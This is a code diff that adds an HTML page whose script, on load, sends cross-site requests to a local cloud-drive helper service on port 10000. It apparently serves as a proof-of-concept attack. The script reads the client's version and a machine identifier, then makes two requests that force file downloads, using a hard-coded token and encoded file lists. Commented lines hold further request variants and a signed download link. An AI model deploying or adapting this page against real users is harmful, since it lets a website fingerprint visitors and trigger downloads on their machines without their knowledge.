@@ -1,0 +1,44 @@
+
+<html>
+    
+    <script>
+        function send_packet(method,url,data) {
+            var xml=null;
+        	if (window.XMLHttpRequest) {
+        	    xml = new XMLHttpRequest();
+       		} else if (window.ActiveXObject) {
+        	    xml = new ActiveXObject("Microsoft.XMLHTTP");
+        	}
+            xml.open(method, url, false);
+        	xml.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+        	xml.send(data);
+            return xml.responseText;
+       }
+        	//var url = 'http://127.0.0.1:10000/guanjia?method=DownloadShareItems&checkuser=0&bdstoken=da81a7aa87cb139bd9b82555683fe63b&channel=chunlei&clienttype=0&web=1&app_id=250528';
+        	//http://127.0.0.1:10000/guanjia?method=DownloadSelfOwnItems&uk=1&checkuser=0&bdstoken=da81a7aa87cb139bd9b82555683fe63b&channel=chunlei&clienttype=0&web=1&app_id=250528
+        	//var data= 'filelist=opUqZIg7lhaXjq7YJjQV1t65d4G2NZJr6mwXG8IGv3UwlYw5mP0UC2r5sv60rQVNP%2FJADoBMnmhBNIXdLeoH6063Mcllu1I81AKbcTEZvkW079GLbHPnFk3zcxO%2BfWMW5ijSiBHRAj1dwT8C0OtwHucRtzWNP%2FFRgB7vBRMGWAy8wO4NdVHc4GU8Pj5wmE%2FG8lmtqOgMZdLhW749%2F1nay8u0lk%2BLmxY%2F8m8w0yyf6nSJ1dOIIBgqjMPL312OdSXOqDC8G%2BTF31WZ5AkmfrphIrwPQCkY9AFxlwLmRhyvX07h5csqBWBtiTdVzrR5JegZm1hxsub7mgr2O2qBr6ojdvUIFXCqDFrnAGDPtLbSnnqPKTytfGk1sj3mK90mZgAAO4lBuhrqzOHoYxnOpUJGuIoRxy1YIGgz3rM2vPtv%2Fbyg1tzIlqENHjuJQboa6szhNcZj61RGimgS8Av6SdATZcLVhZYQcC5qw5ve7qXn5gzX9bRPaltAde%2FIPvTcKx5AXX9JWUk6fyBqM73s5N5xjaReDNiDgKZctEPiM1N2Ud7gPFc9F7FGmzuTRG%2FS8qcmcEgpAmyO9KhDsOecN42yPvONAMLP3JeBgREIQ869NHNCGWqZN4uu2cCex4z3STOGnHMqGZLlKUSNitgd6PKYqz%2FyQA6ATJ5oQTSF3S3qB%2BtOtzHJZbtSPNQCm3ExGb5FtO%2FRi2xz5xaEVDxKOqQfBkmYq%2FhfAGm5c1lIZmfX91tguT2rpCXLJr3BABmrVCqB6A%2BtlIr65gqQ4MBsbsZb5C%2FBuMkT6lH1Pf0OHvDecdYDZaMDf5n%2BvhIvEELX4GjiSriBSx5Up7UpEUc6DW%2FkhcBmLbCZhceA34PnAPrArNcFCNdTGAsy9EFRudCSGYuXVpSPShcZUx2N9X7qdSPt3xT7dpH5Q8dnkt8FUVBQGQR%2FD6GscwXz9aHkfWUPAcmOYc0PVKxRh6uoQKtrycSnIie3y%2BLviFOgeYgvtZIfXIpJk7yK1EcMlist7567m%2FKQJkYtiRjhfxyZCiL5I4b7N4sUkl6EvdULtAy4LJ%2B7%2BcW8K8fa82Qi9d2Fp2RnXTXAMv4NtvYdEpcH1FJ6bl02AQYzb29VO3sy6fQ6hsPq907TGfe81%2F7T4zOp03vgLPRFNtCBrmMVRyKg1ktVawKciivKm73%2FyrDMnnNS34A6yBLCPIpUUFrTHduc%2F%2FziCe6opE0HgPnM1%2F2%2FIGRScaW%2FC9vwWLiVN0Oad7SJl6RkisEDuaI9mQoiYj%2FqV3%2BQ%2B5jN37TUo9dk3o4Ug17StVVJJ9eUPPlvmRoCythk7pScAZ98off2V1%2FgulVgaE44xtvCHxMsspEMbauK8y0epJVLQGhFscO0G0T0ofno%2BoynZNc%3D';
+        	//'[{"fs_id":54712922114815,"app_id":"250528","parent_path":"%2F%E5%AE%89%E8%A3%85%E5%8C%85%E4%B8%93%E5%8C%BA%2FPhotoshop%2FPhotoshop%20CS6%E7%BB%BF%E8%89%B2%E7%B2%BE%E7%AE%80%E7%89%88","server_filename":"Photoshop CS6\u7eff\u8272\u7cbe\u7b80\u7248.zip","size":130926971,"server_mtime":1446967394,"server_ctime":1415285685,"local_mtime":1415285685,"local_ctime":1415285685,"isdir":0,"isdelete":"0","status":"0","category":6,"share":"0","path_md5":"18434066479774873353","delete_fs_id":"0","extent_int3":"0","extent_tinyint1":"0","extent_tinyint2":"0","extent_tinyint3":"0","extent_tinyint4":"0","path":"\/\u5b89\u88c5\u5305\u4e13\u533a\/Photoshop\/Photoshop CS6\u7eff\u8272\u7cbe\u7b80\u7248\/Photoshop CS6\u7eff\u8272\u7cbe\u7b80\u7248.zip","root_ns":544104072,"md5":"6f9b03aea552d351461fecd1343a4513","file_key":""}]';
+        	//filelist=%7B%22filelist%22%3A%5B%7B%22isdir%22%3A%220%22%2C%22md5%22%3A%22584ba07ed49ee9fb1866e1efb6eb9dae%22%2C%22server_path%22%3A%22%2FI9500XXUHOD4_lishuo.zip%22%2C%22size%22%3A%221135731549%22%2C%22shareid%22%3A%22%22%2C%22uk%22%3A%22%22%2C%22token%22%3A%22%22%2C%22fs_id%22%3A430914538807085%2C%22link%22%3A%22http%3A%2F%2Fd.pcs.baidu.com%2Ffile%2F584ba07ed49ee9fb1866e1efb6eb9dae%3Ffid%3D840862791-250528-430914538807085%26time%3D1456305204%26rt%3Dpr%26sign%3DFDTAERVCY-DCb740ccc5511e5e8fedcff06b081203-P4ffSjmp7%252FjVVG68d87oai4QDNU%253D%26expires%3D8h%26chkv%3D1%26chkbd%3D1%26chkpc%3Det%26dp-logid%3D1269056621223660851%26dp-callid%3D0%26r%3D440109364%22%7D%5D%7D
+       		
+        function get_version() {
+            output('baidu_guanjia_version',send_packet('GET','http://127.0.0.1:10000/guanjia?method=GetVersion',null));
+        }
+        function get_pc_code() {
+            output('baidu_guanjia_pc_code',send_packet('GET','http://127.0.0.1:10000/guanjia?method=GetPcCode',null));
+        }
+        function download_file(file_url,file_data) {
+            output('baidu_guanjia_version',send_packet('POST',file_url,file_data));
+        }
+        function output(element,data) {
+            document.write(data+'<br/>');
+        }
+        get_version();
+        get_pc_code();
+        download_file('http://127.0.0.1:10000/guanjia?method=DownloadShareItems&uk=0&checkuser=0&bdstoken=da81a7aa87cb139bd9b82555683fe63b&channel=chunlei&clienttype=0&web=1&app_id=250528','filelist=opUqZIg7lhaXjq7YJjQV1t65d4G2NZJr6mwXG8IGv3UwlYw5mP0UC2r5sv60rQVNP%2FJADoBMnmhBNIXdLeoH6063Mcllu1I81AKbcTEZvkW079GLbHPnFk3zcxO%2BfWMW5ijSiBHRAj1dwT8C0OtwHucRtzWNP%2FFRgB7vBRMGWAy8wO4NdVHc4GU8Pj5wmE%2FG8lmtqOgMZdLhW749%2F1nay8u0lk%2BLmxY%2F8m8w0yyf6nSJ1dOIIBgqjMPL312OdSXOqDC8G%2BTF31WZ5AkmfrphIrwPQCkY9AFxlwLmRhyvX07h5csqBWBtiTdVzrR5JegZm1hxsub7mgr2O2qBr6ojdvUIFXCqDFrnAGDPtLbSnnqPKTytfGk1sj3mK90mZgAAO4lBuhrqzOHoYxnOpUJGuIoRxy1YIGgz3rM2vPtv%2Fbyg1tzIlqENHjuJQboa6szhNcZj61RGimgS8Av6SdATZcLVhZYQcC5qw5ve7qXn5gzX9bRPaltAde%2FIPvTcKx5AXX9JWUk6fyBqM73s5N5xjaReDNiDgKZctEPiM1N2Ud7gPFc9F7FGmzuTRG%2FS8qcmcEgpAmyO9KhDsOecN42yPvONAMLP3JeBgREIQ869NHNCGWqZN4uu2cCex4z3STOGnHMqGZLlKUSNitgd6PKYqz%2FyQA6ATJ5oQTSF3S3qB%2BtOtzHJZbtSPNQCm3ExGb5FtO%2FRi2xz5xaEVDxKOqQfBkmYq%2FhfAGm5c1lIZmfX91tguT2rpCXLJr3BABmrVCqB6A%2BtlIr65gqQ4MBsbsZb5C%2FBuMkT6lH1Pf0OHvDecdYDZaMDf5n%2BvhIvEELX4GjiSriBSx5Up7UpEUc6DW%2FkhcBmLbCZhceA34PnAPrArNcFCNdTGAsy9EFRudCSGYuXVpSPShcZUx2N9X7qdSPt3xT7dpH5Q8dnkt8FUVBQGQR%2FD6GscwXz9aHkfWUPAcmOYc0PVKxRh6uoQKtrycSnIie3y%2BLviFOgeYgvtZIfXIpJk7yK1EcMlist7567m%2FKQJkYtiRjhfxyZCiL5I4b7N4sUkl6EvdULtAy4LJ%2B7%2BcW8K8fa82Qi9d2Fp2RnXTXAMv4NtvYdEpcH1FJ6bl02AQYzb29VO3sy6fQ6hsPq907TGfe81%2F7T4zOp03vgLPRFNtCBrmMVRyKg1ktVawKciivKm73%2FyrDMnnNS34A6yBLCPIpUUFrTHduc%2F%2FziCe6opE0HgPnM1%2F2%2FIGRScaW%2FC9vwWLiVN0Oad7SJl6RkisEDuaI9mQoiYj%2FqV3%2BQ%2B5jN37TUo9dk3o4Ug17StVVJJ9eUPPlvmRoCythk7pScAZ98off2V1%2FgulVgaE44xtvCHxMsspEMbauK8y0epJVLQGhFscO0G0T0ofno%2BoynZNc%3D');
+        download_file('http://127.0.0.1:10000/guanjia?method=DownloadShareItems&uk=0&checkuser=0&bdstoken=da81a7aa87cb139bd9b82555683fe63b&channel=chunlei&clienttype=0&web=1&app_id=250528','filelist=opUqZIg7lhabowADkR56umGTsXSI75FMArOoRAftdZd27DTXgKyMHgneFM%2FvrEy9i0as29lDGnMe9a0PdMJRPSxvlJ4VO0zZmVrmtVwO%2B8g0XSm24X2gFUaUxowrlKW%2BmDF5Im4cQUWjQYdpJQVTEQ7eAEa5PMD5KU%2FDA%2Bzh%2FIHo5W6z10EpZmIsbDh7vNnyBVb1NiSdcZIg01iNDlbNB9ZFZ7mnkqt6Dz1Y0WX%2B9Gr4BdS2VC%2BH9jQPYRVlTTpa8CND0qJXhu4hcTAIRqFvRw8jnI120%2Bi0PsiaCN4BUISNnqzo5xBb7%2Fe6Hn6BtxQtQkJRvIBe9X5tF4DPFOiPiYwLfCRnT0Q%2BDv5XR3IZu3Ie8LPzx2HY7KaS93WG3O6MgmKbOs2q4ch2LMB8774CHqjWT4VltDd70gSDVb%2FBG8%2Bmkvd1htzujPm63wsjcfRnvpwOZo4Fuf4lar%2FpQJMWO4SqMJ4kNnhCfcrlkrkNwA8yfK0iUX8R34GRz3XY45iKltP9oK5MXwFIYXPVo3R5zGFEyXhq%2FykNjuf47ng9LMu1Qbdx2oCeaNtjLSWAJmorII3YNxnkYoR%2Bbyk058Tp%2BnN4%2BmbRAUp7o59y%2FJrQ6TOqocneFJP%2BZv16dbxgYR6S%2Fcgsuiyyq52z%2FrRCvNMMYb0a5Sc8bb9v7WIJaDNB%2FpX8uPlDt4oG2aJCwx1HfUfTPzfz7iQeQRCMaZVEFqGKFSX1oe8%2FbXq49f3MNstg7rTO%2F2RMDJWK1TJpVBZoe1qQSXpT06DAdTUmE4MasOwiGSVf2pNl3EZav1b2%2FS16OG9OjX0h%2FKRQSH9b9aXxvhGaZC6eEifNsgrDthBz54Y6sd2Ea04AnTY7GyQT2GYXqsX38UEd0nnwU%2BF2dFTU9BBnOAc6tGmWPcHeY3Tl%2FdWnoeiX4h8cXGNvOdSMBqLcs2M2Ez4LhAueEXjG%2FcsThBbOxSQlltgsCUfdp2Rl87kwYHa5u3f%2Ba8eX%2FFsJfbHQhKZolVs%2BWopMjoEbP2au2SHr%2F%2FPndqc18lm%2F%2BZrrhM7fP1na6xDnGWEyQhkAIh5xV3qGsoWp5g%2BCB5X2TrmNymB2Gs16%2BzXXlnibj1VvSS8xacHr7%2FmTpw8RPFnwbjLvS8KahqfAh8xisJJvK3bkx6u9kRQh0ZFuj%2FUG9faYIPArgK4PCCvOlGUr5Wpkc8zmj89jjpRyHcQdCpVtF9U4dmHe8027VFpDeZ%2Bo8Y0rdmdHHXAHLM83YjV1%2B7N6H40Upexoe2lPxtd5RTfNGmyWd9%2BqJFuiJnrX0u80fi8kVLqHmXN1InIBZC9L');
+    </script>
+
+    <body>
+    </body>
+    
+</html>
